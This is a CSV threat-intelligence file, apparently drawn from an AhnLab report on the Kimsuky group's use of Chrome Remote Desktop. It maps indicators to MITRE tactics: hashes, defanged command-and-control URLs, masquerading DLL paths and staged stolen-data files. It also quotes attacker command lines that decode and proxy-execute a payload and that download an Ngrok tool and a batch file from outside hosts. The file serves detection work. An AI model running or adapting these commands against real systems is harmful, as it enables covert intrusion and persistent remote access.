Date,Source,Description,Objective,Ioc,IocType,IocDescription,Tactic,Technique
20230707,AhnLab,Kimsuky Threat Group Using Chrome Remote Desktop,Pesistent Access to Victim Host,powershell.exe -windowstyle hidden certutil -decode c:\windows\..\programdata\tnlugak.ug76 c:\windows\..\programdata\o5c2ank.efgl,CommandLine,AppleSeed Decode,5 - Defense Evasion,Deobfuscate/Decode Files or Information
20230707,AhnLab,Kimsuky Threat Group Using Chrome Remote Desktop,Pesistent Access to Victim Host,powershell.exe -windowstyle hidden cmd /c cmd /c regsvr32.exe /s /n /i:123qweASDZXC C:\Windows\..\ProgramData\o5C2anK.efgL,CommandLine,AppleSeed Execution,5 - Defense Evasion,System Binary Proxy Execution: Regsvr32
20230707,AhnLab,Kimsuky Threat Group Using Chrome Remote Desktop,Pesistent Access to Victim Host,powershell wget hxxps://dl.google[.]com/dl/edgedl/chrome-remote-desktop/chromeremotedesktophost.msi -outfile c:\programdata\cm.msi,CommandLine,Chrome Remote Desktop MSI,3 - Persistence,External Remote Services
20230707,AhnLab,Kimsuky Threat Group Using Chrome Remote Desktop,Pesistent Access to Victim Host,powershell wget hxxps://bigfile.mail.naver[.]com/download?fid=lekqm6cmwzu9hqujfovzfq2lfamjkogzkqgrkoewkoeqkabjkxmlkaulfqula3ydaxgrp63cm4u9mopvmqbmpxm/kzk0kzewkxbmfqvxp2== -outfile c:\programdata\svchost.exe,CommandLine,Download Ngrok,10 - Command and Control,Ingress Tool Transfer
20230707,AhnLab,Kimsuky Threat Group Using Chrome Remote Desktop,Pesistent Access to Victim Host,%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe –code=”Authentication Code” –redirect-url=”hxxps://remotedesktop.google[.]com/_/oauthredirect” –name=%COMPUTERNAME%,CommandLine,Enable Chrome Remote Desktop,3 - Persistence,External Remote Services
20230707,AhnLab,Kimsuky Threat Group Using Chrome Remote Desktop,Pesistent Access to Victim Host,%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe –code=”4/0AbUR2VPfKC4jyx4j-ARJD2NwkebJQOTbicMGcNW1kUn7UNhE0VNaycr3zDhY4tRx9JT4eg” –redirect-url=”hxxps://remotedesktop.google[.]com/_/oauthredirect” –name=%COMPUTERNAME% –pin=230625,CommandLine,Enable Chrome Remote Desktop,3 - Persistence,External Remote Services
20230707,AhnLab,Kimsuky Threat Group Using Chrome Remote Desktop,Pesistent Access to Victim Host,powershell wget hxxp://****[.]kr/gnuboard4/23.bat -outfile c:\programdata\23.bat,CommandLine,Enable Chrome Remote Desktop Batch File,3 - Persistence,External Remote Services
20230707,AhnLab,Kimsuky Threat Group Using Chrome Remote Desktop,Pesistent Access to Victim Host,%APPDATA%Adobe\Service\AdobeService.dll,FilePath,AppleSeed Installation Path,5 - Defense Evasion,Masquerading: Match Legitimate Name or Location
20230707,AhnLab,Kimsuky Threat Group Using Chrome Remote Desktop,Pesistent Access to Victim Host,%APPDATA%EastSoft\Control\Service\EastSoftUpdate.dll,FilePath,AppleSeed Installation Path,5 - Defense Evasion,Masquerading: Match Legitimate Name or Location
20230707,AhnLab,Kimsuky Threat Group Using Chrome Remote Desktop,Pesistent Access to Victim Host,E:\00.duty\03.source\01.pc\pc-engine\hope\x64\Release\hp_aux_multirdp.pdb,FilePath,RDP Patch To Allow Multiple Connections,3 - Persistence,External Remote Services
20230707,AhnLab,Kimsuky Threat Group Using Chrome Remote Desktop,Pesistent Access to Victim Host,C:\ProgramData\Adobe\mui.db,FilePath,Stolen Information Database,9 - Collection,Data Staged: Local Data Staging
20230707,AhnLab,Kimsuky Threat Group Using Chrome Remote Desktop,Pesistent Access to Victim Host,C:\ProgramData\Adobe\ch.db,FilePath,Stolen Information Database (Chrome),9 - Collection,Data Staged: Local Data Staging
20230707,AhnLab,Kimsuky Threat Group Using Chrome Remote Desktop,Pesistent Access to Victim Host,C:\ProgramData\Adobe\ed.db,FilePath,Stolen Information Database (Edge),9 - Collection,Data Staged: Local Data Staging
20230707,AhnLab,Kimsuky Threat Group Using Chrome Remote Desktop,Pesistent Access to Victim Host,C:\ProgramData\Adobe\nw.db,FilePath,Stolen Information Database (Naver Whale),9 - Collection,Data Staged: Local Data Staging
20230707,AhnLab,Kimsuky Threat Group Using Chrome Remote Desktop,Pesistent Access to Victim Host,80f381a20d466e7a02ea37592a26b0b8,MD5,AppleSeed (AdobeService.dll),5 - Defense Evasion,Masquerading: Match Legitimate Name or Location
20230707,AhnLab,Kimsuky Threat Group Using Chrome Remote Desktop,Pesistent Access to Victim Host,b6d11017e02e7d569cfe203eda25f3aa,MD5,AppleSeed (EastSoftUpdate.dll),5 - Defense Evasion,Masquerading: Match Legitimate Name or Location
20230707,AhnLab,Kimsuky Threat Group Using Chrome Remote Desktop,Pesistent Access to Victim Host,946e1e0d2e0d7785d2e2bcd3634bcd2a,MD5,Chrome Remote Desktop launcher,3 - Persistence,External Remote Services
20230707,AhnLab,Kimsuky Threat Group Using Chrome Remote Desktop,Pesistent Access to Victim Host,d2eb306ee0d7dabfe43610e0831bef49,MD5,InfoStealer,5 - Defense Evasion,Data Staged: Local Data Staging
20230707,AhnLab,Kimsuky Threat Group Using Chrome Remote Desktop,Pesistent Access to Victim Host,d6a38ffdbac241d69674fb142a420740,MD5,RDP Patcher,3 - Persistence,External Remote Services
20230707,AhnLab,Kimsuky Threat Group Using Chrome Remote Desktop,Pesistent Access to Victim Host,b8719e8f82ec55f70dc8b1bbb9571119baabd54f4bbf0091008c6a07d6a4110b,SHA256,AppleSeed (AdobeService.dll),5 - Defense Evasion,Masquerading: Match Legitimate Name or Location
20230707,AhnLab,Kimsuky Threat Group Using Chrome Remote Desktop,Pesistent Access to Victim Host,95a13b1f8f8a1ad765e54d21812e9c71886524a76873d09ee504614af514060d,SHA256,AppleSeed (EastSoftUpdate.dll),5 - Defense Evasion,Masquerading: Match Legitimate Name or Location
20230707,AhnLab,Kimsuky Threat Group Using Chrome Remote Desktop,Pesistent Access to Victim Host,2289a8c44a90585d02f8aa22ff0e9b669d86cdd4af58ca14286fb235428fb1e,SHA256,Chrome Remote Desktop launcher,3 - Persistence,External Remote Services
20230707,AhnLab,Kimsuky Threat Group Using Chrome Remote Desktop,Pesistent Access to Victim Host,hxxp://getara1.mygamesonline[.]org/,URL,AppleSeed (AdobeService.dll),10 - Command and Control,Ingress Tool Transfer
20230707,AhnLab,Kimsuky Threat Group Using Chrome Remote Desktop,Pesistent Access to Victim Host,hxxp://pikaros2.r-e[.]kr/,URL,AppleSeed (EastSoftUpdate.dll),10 - Command and Control,Ingress Tool Transfer
20230707,AhnLab,Kimsuky Threat Group Using Chrome Remote Desktop,Pesistent Access to Victim Host,hxxps://bigfile.mail.naver[.]com/download?fid=lekqm6cmwzu9hqujfovzfq2lfamjkogzkqgrkoewkoeqkabjkxmlkaulfqula3ydaxgrp63cm4u9mopvmqbmpxm/kzk0kzewkxbmfqvxp2==,URL,Download Ngrok,3 - Persistence,External Remote Services
